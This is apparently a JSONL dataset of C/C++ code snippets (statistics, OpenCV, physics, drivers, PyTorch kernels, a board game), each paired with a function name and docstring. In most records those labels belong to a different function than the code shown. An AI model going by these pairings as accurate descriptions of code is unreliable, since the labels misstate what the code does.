{"content":"{'function_name': 'get_sigma_mean', 'docstring': '\/\/ function to calculate the standard error in the mean', 'code': 'int main() {\\n\\n  string filename;\\n  cout << \"Enter name of file to open: \";\\n  cin >> filename;\\n\\n  \/\/ open file and check that it opened properly\\n  ifstream inputFile(filename.c_str());\\n  if (!inputFile.good()) {\\n    cout << \"Error: could not open input file.\\\\n\";\\n    return 1;\\n  } else {\\n    cout << filename << \" opened successfully.\\\\n\";\\n  }\\n\\n  double N;\\n  int data_points;\\n\\n  \/\/ Ask for user input\\n  cout << \"Enter the number of data points in the file.\\\\nIf you don\\'t know, \"\\n          \"just type in 0 and I\\'ll tell you.\\\\nNumber of data points: \";\\n  cin >> N;\\n  \/\/ make sure there was valid input\\n  while (cin.fail() || (N < 0) || (fmod(N, 1) != 0)) {\\n    cout << \"Invalid input, please enter the number of data points: \";\\n    cin.clear();\\n    \/\/ clear cin buffer until end of line character\\n    cin.ignore(std::numeric_limits<std::streamsize>::max(), \\'\\\\n\\');\\n    cin >> N;\\n  }\\n  \/\/ cast N to an integer for array size\\n  data_points = (int)N;\\n\\n  \/\/ create temp file, check it was created then close it\\n  ofstream newFile(\"temp.dat\");\\n  if (!newFile.good()) {\\n    cout << \"Error: could not create temp file.\\\\n\";\\n    return 1;\\n  }\\n\\n  double temp;\\n  for (int i{0}; !inputFile.eof(); i++) {\\n    inputFile >> temp;\\n    while (inputFile.fail()) {\\n      inputFile.clear();\\n      \/\/ delete until the newline character \\\\n\\n      inputFile.ignore(std::numeric_limits<std::streamsize>::max(), \\'\\\\n\\');\\n      if (inputFile.eof()) {\\n        inputFile.clear();\\n        inputFile.ignore();\\n      } else {\\n        inputFile >> temp;\\n        cout << \"Warning: bad data point. Skipping.\\\\n\";\\n      }\\n    }\\n    if (inputFile.eof()) {\\n      \/\/ end of file, clear the fail bit and ignore the eof, do not write to\\n      \/\/ newFile\\n      inputFile.clear();\\n      inputFile.ignore();\\n    } else {\\n      \/\/ not end of file, dump into new file followed by a newline\\n      newFile << temp << endl;\\n    }\\n    data_points = i;\\n  }\\n\\n  if (N == 0) {\\n    \/\/ if they didn\\'t know how many data points were in the file, tell them\\n    cout << \"There are \" << data_points << \" data points in the file.\\\\n\";\\n  } else {\\n    \/\/ if they entered the wrong number of points, tell them that the correct\\n    \/\/ number was used\\n    if ((int)N != data_points) {\\n      cout << \"You told me that there were \" << (int)N\\n           << \" data points in the file but there are actually \" << data_points\\n           << \" data points in the file.\\\\nI have used N=\" << data_points\\n           << \" in the calculation.\\\\n\";\\n    }\\n  }\\n\\n  \/\/ close input file input stream\\n  inputFile.close();\\n  \/\/ close temp file output stream\\n  newFile.close();\\n\\n  \/\/ open temp file as input stream\\n  ifstream tempFile(\"temp.dat\");\\n  if (!tempFile.good()) {\\n    cout << \"Error: could not open temp file.\\\\n\";\\n    return 1;\\n  }\\n\\n  \/\/ create dynamic sized array\\n  double *charge = new double[data_points];\\n\\n  \/\/ read data into the array from the clean temp file\\n  for (int i{0}; i < data_points; i++) {\\n    tempFile >> charge[i];\\n  }\\n\\n  \/\/ close temp file input stream\\n  tempFile.close();\\n\\n  \/\/ calculate values\\n  double mean = get_mean(charge, data_points);\\n  double sigma = get_sigma(charge, mean, data_points);\\n  double sigma_mean = get_sigma_mean(sigma, data_points);\\n\\n  \/\/ garbage collection\\n  delete[] charge;\\n\\n  \/\/ output calculated values\\n  cout << \"Mean is \" << mean << endl;\\n  cout << \"Standard deviation is \" << sigma << endl;\\n  cout << \"Standard error in mean is \" << sigma_mean << endl;\\n\\n  \/\/ exit\\n  return 0;\\n}'}","id":1488}
{"content":"{'function_name': 'HoughDetection', 'docstring': '\/\/ \u663e\u793a\u7ed3\u679c', 'code': 'int run911()\\n{\\n\\tMat src, src_gray;\\n\\tsrc = imread(\"opencv-logo.png\", 1);\\n\\t\/\/src = imread(\"C:\\\\\\\\images\\\\\\\\board.jpg\", 1);\\n\\tif (!src.data)\\n\\t{\\n\\t\\tstd::cerr << \"\u6587\u6863\u8bfb\u53d6\u5931\u8d25\\\\n\";\\n\\t\\treturn -1;\\n\\t}\\n\\n\\t\/\/ \u8f6c\u6210\u7070\u5ea6\\n\\tcvtColor(src, src_gray, COLOR_BGR2GRAY);\\n\\n\\t\/\/ \u51cf\u5c11\u566a\u58f0\u6240\u4ee5\u4e0d\u7528\u9519\u8bef\u7684\u5706\u5708\u68c0\u6d4b\\n\\tGaussianBlur(src_gray, src_gray, Size(9, 9), 2, 2);\\n\\n\\t\/\/\u58f0\u660e\u53d8\u91cf\u6539\u53d8\u524d\u7684\u521d\u59cb\u503c\\n\\tint cannyThreshold = cannyThresholdInitialValue;\\n\\tint accumulatorThreshold = accumulatorThresholdInitialValue;\\n\\n\\t\/\/\u521b\u5efa\u7a97\u53e3\\n\\tnamedWindow(windowName, WINDOW_AUTOSIZE);\\n\\n\\t\/\/\u521b\u5efa\u6ed1\u6746\\n\\tcreateTrackbar(cannyThresholdTrackbarName, windowName,\\n\\t\\t&cannyThreshold, maxCannyThreshold);\\n\\n\\tcreateTrackbar(accumulatorThresholdTrackbarName,\\n\\t\\twindowName, &accumulatorThreshold,\\n\\t\\tmaxAccumulatorThreshold);\\n\\n\\t\/\/ \u5c06\u6267\u884c\u7ed3\u679c\u663e\u793a\\n\\tint key = 0;\\n\\twhile (key != \\'q\\' && key != \\'Q\\')\\n\\t{\\n\\t\\t\/\/\u68c0\u5bdf\u53c2\u6570\u4e0d\u53ef\u4e3a 0\\n\\t\\tcannyThreshold = std::max(cannyThreshold, 1);\\n\\t\\taccumulatorThreshold = std::max(accumulatorThreshold, 1);\\n\\n\\t\\t\/\/runs the detection, and update the display\\n\\t\\tHoughDetection(src_gray, src, cannyThreshold, accumulatorThreshold);\\n\\n\\t\\tkey = waitKey(10);\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":1500}
{"content":"{'function_name': 'calc_dist_P_to_OA', 'docstring': '\/\/TVector3 CD = 1.\/P.Mag() * PC.Cross(P);', 'code': 'double calc_dist_P_to_OA_phi(const TVector3 &P, const TVector3 &OA)\\n{\\n\\t\/\/ Project OP to direction that perpenticular to OA -> PC\\n\\tTVector3 PC = 1.\/OA.Mag() * P.Cross(OA);\\n\\n\\t\/\/ Project PC to direction that perpenticular to OP -> CD; to get PC in phi direction projection\\n\\tTVector3 CD = 1.\/P.Mag() * PC.Cross(P);\\n\\n\\treturn CD.Mag();\\n}'}","id":1501}
{"content":"{'function_name': 'solveEquationOne', 'docstring': '\/\/ \"other-side\" matrix', 'code': 'bool solveEquationTwo()\\n{\\n\\tcout << \"TEST02: Solve a linear equation with more arithmetic.\\\\n\";\\n\\n\\t\/\/ right-hand side\\n\\tMatrix a{1, 1};\\t\\t\/\/ coefficient matrix\\n\\ta(1, 1) = 2;\\n\\tcout << \"\\\\t\\\\tMatrix A:\\\\n\" << a << \"\\\\n\";\\n\\n\\tMatrix c{1, 1};\\t\\t\/\/ constants matrix\\n\\tc(1, 1) = 1;\\n\\tcout << \"\\\\t\\\\tMatrix c:\\\\n\" << c << \"\\\\n\";\\n\\n\\t\/\/ left-hand side\\n\\tMatrix b{1, 1};\\t\\t\/\/ \"other-side\" matrix\\n\\tb(1, 1) = 7;\\n\\tcout << \"\\\\t\\\\tMatrix B:\\\\n\" << b << \"\\\\n\";\\n\\n\\t\/\/ correct answer\\n\\tMatrix answer{1, 1};\\n\\tanswer(1, 1) = 3;\\n\\tcout << \"\\\\t\\\\tAnswer:\\\\n\" << answer << \"\\\\n\";\\n\\n\\t\/\/ Attempt to solve the equation.\\n\\tb = b - c;\\n\\treturn b.divide(a) == answer;\\n}'}","id":1504}
{"content":"{'function_name': 'CreateLeaseAgent', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nCloseLeaseAgentInternal(\\n    __in PTRANSPORT_LISTEN_ENDPOINT SocketAddress,\\n    __in BOOL CleanUpImmideately\\n    )\\n\\n\/*++\\n \\nRoutine Description:\\n \\n    Closes and frees all resources associated with a lease agent. \\n    This will unregister all applications previously registered for this lease agent.\\n    The timing of the cleanup would depend on the flag passed. If the flag is true\\n    the clean up would be immideate. If not the clean up will happen when the \\n    leases expir.\\n\\nParameters Description:\\n \\n    SocketAddress - socket address of lease agent to be closed.\\n    CleanUpImmideately - Whether to clean up state immideately.\\n \\nReturn Value:\\n \\n    TRUE if lease agent was successfully uninitialized, FALSE otherwise. \\n    Call GetLastError to retrieve the actual error that occured.\\n \\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n\\n    CLOSE_LEASE_AGENT_BUFFER_DEVICE_IOCTL DeviceIoctlInputBuffer;\\n    ZeroMemory(&DeviceIoctlInputBuffer, sizeof(CLOSE_LEASE_AGENT_BUFFER_DEVICE_IOCTL));\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer \\n    \/\/ has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized()) {\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == SocketAddress) {\\n\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Initialize device IOCTL input buffer.\\n    \/\/\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.SocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        SocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Create a device IOCTL and send it to the device.\\n    \/\/\\n    if (CleanUpImmideately) {\\n        return NT_SUCCESS(DeviceIoControl(\\n            IOCTL_LEASING_CLOSE_LEASE_AGENT,\\n            &DeviceIoctlInputBuffer,\\n            sizeof(CLOSE_LEASE_AGENT_BUFFER_DEVICE_IOCTL),\\n            NULL,\\n            0,\\n            &BytesReturned))? TRUE : FALSE;\\n    }\\n    else {\\n        return NT_SUCCESS(DeviceIoControl(\\n            IOCTL_LEASING_BLOCK_LEASE_AGENT,\\n            &DeviceIoctlInputBuffer,\\n            sizeof(CLOSE_LEASE_AGENT_BUFFER_DEVICE_IOCTL),\\n            NULL,\\n            0,\\n            &BytesReturned))? TRUE : FALSE;\\n    }\\n}'}","id":1505}
{"content":"{'function_name': 'denoiseb_rd25_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd26_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd26 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2897 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_2897();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1509}
{"content":"{'function_name': 'AddDevice', 'docstring': '\/\/ need to cleanup\\r', 'code': 'NTSTATUS CompleteRequest(IN PIRP Irp, IN NTSTATUS status, IN ULONG_PTR info)\\r\\n\\t{\\t\\t\\t\\t\\t\\t\\t\/\/ CompleteRequest\\r\\n\\tIrp->IoStatus.Status = status;\\r\\n\\tIrp->IoStatus.Information = info;\\r\\n\\tIoCompleteRequest(Irp, IO_NO_INCREMENT);\\r\\n\\treturn status;\\r\\n\\t}'}","id":1514}
{"content":"{'function_name': 'CleanupDetours', 'docstring': '\/\/ Run through all active detours we added.\\r', 'code': \"bool UpdateRegisterArgumentSizes(CHook* pDetour, HookSetup *setup)\\r\\n{\\r\\n\\t\/\/ The registers the arguments are passed in might not be the same size as the actual parameter type.\\r\\n\\t\/\/ Update the type info to the size of the register that's now holding that argument,\\r\\n\\t\/\/ so we can copy the whole value.\\r\\n\\tICallingConvention* callingConvention = pDetour->m_pCallingConvention;\\r\\n\\tstd::vector<DataTypeSized_t> &argTypes = callingConvention->m_vecArgTypes;\\r\\n\\tint numArgs = argTypes.size();\\r\\n\\r\\n\\tfor (int i = 0; i < numArgs; i++)\\r\\n\\t{\\r\\n\\t\\t\/\/ Ignore regular arguments on the stack.\\r\\n\\t\\tif (argTypes[i].custom_register == None)\\r\\n\\t\\t\\tcontinue;\\r\\n\\r\\n\\t\\tCRegister *reg = pDetour->m_pRegisters->GetRegister(argTypes[i].custom_register);\\r\\n\\t\\t\/\/ That register can't be handled yet.\\r\\n\\t\\tif (!reg)\\r\\n\\t\\t\\treturn false;\\r\\n\\r\\n\\t\\targTypes[i].size = reg->m_iSize;\\r\\n\\t\\tsetup->params[i].size = reg->m_iSize;\\r\\n\\t}\\r\\n\\r\\n\\treturn true;\\r\\n}\"}","id":1515}
{"content":"{'function_name': 'coef_calc', 'docstring': '\/* \u0412\u0441\u043f\u043e\u043c\u043e\u0433\u0430\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u043f\u0440\u043e\u0446\u0435\u0434\u0443\u0440\u0430 \u0440\u0430\u0441\u0441\u0447\u0435\u0442\u0430 \u043a\u0430\u043b\u0438\u0431\u0440\u043e\u0432\u043e\u0447\u043d\u044b\u0445 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442\u043e\u0432 (GAIN, OFFSET)\\n     * \u043f\u043e \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f \u043c\u043e\u0434\u0443\u043b\u044f \u0441\u043e\u0431\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0433\u043e \u043d\u0443\u043b\u044f, +\u0448\u043a\u0430\u043b\u044b, - \u0448\u043a\u0430\u043b\u044b\\n     * (\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0431\u0435\u0440\u0443\u0442\u0441\u044f \u0438\u0437 hnd->AutoCalibrInfo[gain].TempScale[0])\\n     * \u043f\u0443\u0442\u0435\u043c \u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u044f \u043f\u0440\u044f\u043c\u043e\u0439 \u0441 \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u043c \u0441\u0440\u0435\u0434\u043d\u0435\u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0438\u0447\u043d\u044b\u043c \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435\u043c\\n     * \u0432 \u0440\u0435\u0436\u0438\u043c\u0435 \u0430\u0432\u0442\u043e\u043a\u0430\u043b\u0438\u0431\u0440\u043e\u0432\u043a\u0438\\n     *\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd      - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f;\\n     *   gain     - \u0438\u0437\u043c\u0435\u0440\u044f\u0435\u043c\u044b\u0439 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\\n    * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n    *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n    *\/', 'code': 'int get_autocbr_cnt(PTLTR114 hnd)\\n{\\n    \/* \u0412\u0441\u043f\u043e\u043c\u043e\u0433\u0430\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u043f\u0440\u043e\u0446\u0435\u0434\u0443\u0440\u0430 \u043f\u043e\u0434\u0441\u0447\u0435\u0442\u0430 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e\u0433\u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u043d\u044b\u0445\\n     * \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043f\u0440\u0438 \u0430\u0432\u0442\u043e\u043a\u0430\u043b\u0438\u0431\u0440\u043e\u0432\u043a\u0435 \u0434\u043b\u044f \u043e\u0441\u0440\u0435\u0434\u043d\u0435\u043d\u0438\u044f (\u0437\u0430\u0432\u0438\u0441\u0438\u0442 \u043e\u0442 \u0447\u0430\u0441\u0442\u043e\u0442\u044b \u043c\u043e\u0434\u0443\u043b\u044f)\\n     *\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd      - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f;\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u043a\u043e\u043b-\u0432\u043e \u043e\u0442\u0441\u0447\u0435\u0442\u043e\u0432 \u0434\u043b\u044f \u043e\u0441\u0440\u0435\u0434\u043d\u0435\u043d\u0438\u044f.\\n     *\/\\n    int res = (int)LTR114_FREQ((*hnd))\/10;\\n    if (res < 2)\\n        res = 2;\\n    return res;\\n}'}","id":1523}
{"content":"{'function_name': 'Exact_Solution', 'docstring': '\/\/ put the exact solution ', 'code': 'float Error(float *x, float *u, int Nx) \\n{ \\n\\t\/\/ return max_i |x[i] - u[i]| \\n\\tint i, j; \\n\\tfloat v, e; \\n\\tv = 0.0; \\n\\t\\n\\tfor(i=0;i<Nx;++i) \\n\\t{ \\n\\t\\tfor(j=0;j<Nx;j++) \\n\\t\\t{ \\n\\t\\t\\te = fabs(x[Nx*i+j] - u[Nx*i+j]); \\n\\t\\t\\tif(e > v) v = e;\\n\\t\\t\\t\/\/v = max(v, e); \\n\\t\\t} \\n\\t} \\n\\treturn v; \\n}'}","id":1526}
{"content":"{'function_name': 'pow_tensor_scalar_optimized_kernel', 'docstring': '\/\/ in pow_tensor_scalar_kernel', 'code': 'static void pow_tensor_scalar_kernel(\\n    TensorIteratorBase& iter,\\n    const Scalar& exp_scalar) {\\n  \/\/ prevent multiple calls to iter.common_dtype()\\n  const auto dtype = iter.common_dtype();\\n\\n  if (dtype == ScalarType::Float || dtype == ScalarType::Double ||\\n      dtype == kBFloat16 || isComplexType(dtype)) {\\n    \/\/ Dispatch to fast specialization for sqrt, rsqrt and reciprocal\\n    if (exp_scalar.equal(.5)) {\\n      return sqrt_kernel(iter);\\n    } else if (exp_scalar.equal(-0.5)) {\\n      return rsqrt_kernel(iter);\\n    } else if (exp_scalar.equal(-1.0)) {\\n      return reciprocal_kernel(iter);\\n    }\\n  }\\n\\n  if (dtype == ScalarType::Float || dtype == ScalarType::Double) {\\n    AT_DISPATCH_FLOATING_TYPES(dtype, \"pow\", [&]() {\\n      pow_tensor_scalar_optimized_kernel<scalar_t, double>(\\n          iter, exp_scalar.to<double>());\\n    });\\n  } else if (isComplexType(dtype)) {\\n    AT_DISPATCH_COMPLEX_TYPES(dtype, \"pow\", [&]() {\\n      pow_tensor_scalar_optimized_kernel<scalar_t, scalar_t>(\\n          iter, exp_scalar.to<c10::complex<double>>());\\n    });\\n  } else if (dtype == ScalarType::Half) {\\n    [&]() {\\n      using scalar_t =\\n          decltype(c10::impl::ScalarTypeToCPPType<ScalarType::Half>::t);\\n      const auto exp = exp_scalar.to<scalar_t>();\\n      using Vec = Vectorized<scalar_t>;\\n      cpu_kernel_vec(iter,\\n          [=](scalar_t base) -> scalar_t {\\n            return std::pow(base, exp);\\n          },\\n          [=](Vec base) -> Vec { return base.pow(exp); }\\n      );\\n    }();\\n  } else if (dtype == ScalarType::BFloat16) {\\n      AT_DISPATCH_FLOATING_TYPES_AND(kBFloat16, dtype, \"pow\", [&]() {\\n        pow_tensor_scalar_optimized_kernel<scalar_t, scalar_t>(\\n            iter, exp_scalar.to<scalar_t>());\\n      });\\n  } else {\\n    AT_DISPATCH_INTEGRAL_TYPES(dtype, \"pow\", [&]() {\\n      const scalar_t exp = exp_scalar.to<scalar_t>();\\n      cpu_kernel(iter, [=](scalar_t base) -> scalar_t {\\n        return native::powi(base, exp);\\n      });\\n    });\\n  }\\n}'}","id":1528}
{"content":"{'function_name': 'dynSearch', 'docstring': '\/\/ adjacanecy matrix', 'code': 'NumericVector staSearch2(GenericVector x){\\n  int from                = x[0];               \/\/ from node -> row\\n  int to                  = x[1];               \/\/ to node -> column\\n  int nrun                = x[2];               \/\/ how many runs\\n  int stepmax             = x[3];               \/\/ step limit\\n  NumericMatrix adj       = x[4];               \/\/ adjacanecy matrix\\n  NumericVector nogoNV    = x[5];\\n  NumericVector steplist  = NumericVector(nrun);\/\/ data container\\n  std::cout << from << \"\\\\n\";\\n  std::vector<int> nogo;\\n  int nnodes              = adj.nrow();           \/\/ number of nodes\\n  NumericVector edges;\\n  std::vector<int> neigh;\\n  int steps, pos, found, j, run, sel;\\n  for(j = 0; j < nogoNV.size(); j++) nogo.push_back(int(nogoNV[j]));\\n  for(run = 0; run < nrun; run++){\\n    steps = 0;              \\n    pos   = from;\\n    found = 0;\\n    while(found == 0 & steps < stepmax){\\n      steps++;\\n      edges = adj(pos,_);\\n      neigh.clear();\\n      for(j = 0; j < nnodes; j++){\\n        if(edges(j) == 1){\\n          neigh.push_back(j);\\n          }\\n        }\\n      sel = rand() % neigh.size();\\n      pos = neigh[sel];\\n      if(pos == to && notInVector(pos,nogo)){\\n        found = 1;\\n      }\\n    }\\n    steplist(run) = steps;\\n  }\\n  return steplist;}'}","id":1531}
{"content":"{'function_name': 'initializeVariables', 'docstring': '\/\/Wp_mc_event_weight = 0; ', 'code': 'vector<TLorentzVector> Recluster(vector<TLorentzVector> small_jets, double PTcut, double fcut, double jetRad){\\n  vector<fastjet::PseudoJet> particles = ObjsToPJ(small_jets);\\n  fastjet::JetDefinition fJetDef(fastjet::antikt_algorithm, jetRad, fastjet::Best);\\n  fastjet::ClusterSequence hardClustSeq(particles, fJetDef);\\n  vector<fastjet::PseudoJet> StandardJets = fastjet::sorted_by_pt(hardClustSeq.inclusive_jets(PTcut));\\n  vector<TLorentzVector> RCjets;\\n  for (unsigned int i=0; i<StandardJets.size(); i++){\\n    TLorentzVector sub = TLorentzVector();   \\n    sub.SetPtEtaPhiE(StandardJets[i].pt(), StandardJets[i].eta(), StandardJets[i].phi(), StandardJets[i].e());\\n    vector<fastjet::PseudoJet> constituents = StandardJets[i].constituents();\\n    for(unsigned int iCons = 0; iCons < constituents.size(); iCons++){\\n      \/\/Do something with the small radius jets.\\n    }\\n    RCjets.push_back(sub);\\n  } \\n\\n  vector<TLorentzVector> RTjets;   \\n  \/\/Now for my trimming on the re-clustered jets \\n  for (unsigned int i=0; i<StandardJets.size(); i++){ \\n    TLorentzVector trimmedjet = TLorentzVector(); \\n\\n    int trimmedjet_subjets_n = 0;\\n    \\n    vector<fastjet::PseudoJet> constituents = StandardJets[i].constituents();\\n    for(unsigned int iCons = 0; iCons < constituents.size(); iCons++){\\n      TLorentzVector subjet = TLorentzVector();\\n      subjet.SetPtEtaPhiE(constituents[iCons].pt(), constituents[iCons].eta(), constituents[iCons].phi(), constituents[iCons].e());    \\n      if (subjet.Pt() > fcut*RCjets[i].Pt()){     \\n        trimmedjet+=subjet;\\n\\ttrimmedjet_subjets_n++;\\n      }\\n    }\\n    \/\/if (trimmedjet_subjets_n>1)\\n    RTjets.push_back(trimmedjet);\\n  }\\n  \\n  return RTjets;\\n}'}","id":1542}
{"content":"{'function_name': 'end_move_piece', 'docstring': '\/\/ Set status flags, and then unselect_piece.', 'code': 'void grow_piece(int x, int y)\\n{\\n\\tint new_x, new_y, p, rnd, att, def, add;\\n\\tchar name[MAX_STRING];\\n\\n\\t\/\/ Select random new adjacent square within map boundary.\\n\\tfor ( ; ; )\\n\\t{\\n\\t\\trnd = IRand(0, 8);\\n\\t\\tnew_x = x;\\n\\t\\tnew_y = y;\\n\\n\\t\\tif (rnd == 0 || rnd == 3 || rnd == 5) new_x = x - 1;\\n\\t\\tif (rnd == 2 || rnd == 4 || rnd == 6) new_x = x + 1;\\n\\t\\tif (rnd == 0 || rnd == 1 || rnd == 2) new_y = y - 1;\\n\\t\\tif (rnd == 5 || rnd == 6 || rnd == 7) new_y = y + 1;\\n\\n\\t\\tif (new_x >= 0 && new_y >= 0 && new_x < board_info.board_width && new_y < board_info.board_height) break;  \\n\\t}\\n\\n\\tatt = board[x][y][PIECE].grow_attack + IRand(0, 9);\\n\\n\\t\/\/ Piece already here at new grow target.\\n\\tif (board[new_x][new_y][PIECE].gfx != -1)\\n\\t{\\n\\t\\tif (board[new_x][new_y][PIECE].owner == board[x][y][PIECE].owner) return; \/\/ Can\\'t grow over own pieces..\\n\\n\\t\\tif (board[new_x][new_y][PIECE].defence == 0)\\n\\t\\t{\\n\\t\\t\\t\/\/ Nothing can destroy these pieces normally! Does piece trying to grow now die?\\n\\t\\t\\trnd = IRand(0, 99);\\n\\t\\t\\tif (rnd < board[x][y][PIECE].grow_die_chance) kill_piece(x, y, -1, false);\\n\\t\\t\\treturn;\\n\\t\\t}\\n\\n\\t\\tif (att < 10) \/\/ 10 means always grow regardless of enemy defence..\\n\\t\\t{\\n\\t\\t\\t\/\/ Try to beat enemy\\'s defence to grow..\\n\\t\\t\\tdef = MID(1, board[new_x][new_y][PIECE].defence + (board[new_x][new_y][PIECE].shadow_form * 3), 9) + IRand(0, 9);\\n\\n\\t\\t\\t\/\/ Deal with Undeads.\\n\\t\\t\\tif (board[new_x][new_y][PIECE].undead)\\n\\t\\t\\t{\\n\\t\\t\\t\\tfind_option_choice_variables(CONFIG_OPTIONS, \"GAME\", \"NORMAL CREATURE ATTACKS UNDEADS\", &add, NULL, NULL, NULL);\\n\\t\\t\\t\\tif (add != -1) def = MID(1, def + add, 9);\\n\\t\\t\\t}\\n\\n\\t\\t\\tif (att <= def) return; \/\/ Failed!\\n\\t\\t}\\n\\n\\t\\t\/\/ Does growth cover a piece, or kill it?\\n\\t\\tif (board[x][y][PIECE].grow_covers)\\n\\t\\t{\\n\\t\\t\\tif (wizard_here(new_x, new_y) != -1)\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/ Wizard here! So kill instead..\\n\\t\\t\\t\\tkill_piece(new_x, new_y, board[x][y][PIECE].owner, false);\\n\\t\\t\\t\\tif (board[new_x][new_y][PIECE].gfx != -1) kill_piece(new_x, new_y, board[x][y][PIECE].owner, false); \/\/ Must have been on a mount\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (board[new_x][new_y][PIECE_COVERED].gfx == -1)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tif (board[new_x][new_y][PIECE].grow_chance == 0)\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\/\/ Not a creature already covered here, and this target is not also capable of growing.. So move to cover layers!\\n\\t\\t\\t\\t\\t\\tboard[new_x][new_y][PIECE_COVERED] = board[new_x][new_y][PIECE];\\n\\t\\t\\t\\t\\t\\tboard[new_x][new_y][MOUNTED_COVERED] = board[new_x][new_y][MOUNTED];\\n\\n\\t\\t\\t\\t\\t\\trequest_sound_effect(board[x][y][PIECE].name, \"GROWTH\", \"COVERS\", true);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\t\/\/ Kill enemy piece(s)\\n\\t\\t\\trequest_sound_effect(board[x][y][PIECE].name, \"GROWTH\", \"KILLS\", true);\\n\\t\\t\\tkill_piece(new_x, new_y, board[x][y][PIECE].owner, false);\\n\\t\\t\\tif (board[new_x][new_y][PIECE].gfx != -1) kill_piece(new_x, new_y, board[x][y][PIECE].owner, false); \/\/ Must have been a rider here..\\n\\n\\t\\t\\tdo_effect(EFFECT_EXPLODE, new_x, new_y, 64, 1);\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ Ok. Now we grow..\\n\\tp = find_piece_by_name(board[x][y][PIECE].grow_piece_name);\\n\\tsprintf(name, \"%s\", piece[p].name);\\n\\n\\t\/\/ Can\\'t find piece.. Is this a reference to a group?\\n\\tif (p == -1)\\n\\t{\\n\\t\\tp = pick_random_piece_by_group_name(board[x][y][PIECE].grow_piece_name);\\n\\t\\tsprintf(name, \"%s\", piece[p].name);\\n\\t}\\n\\n\\tif (p == -1) return; \/\/ We couldn\\'t find any piece to grow!\\n\\n\\tcreate_new_piece(name, new_x, new_y);\\n\\tboard[new_x][new_y][PIECE].just_grown = true; \/\/ This new piece shouldn\\'t grow this turn.\\n\\tboard[new_x][new_y][PIECE].owner = board[x][y][PIECE].owner; \/\/ This piece 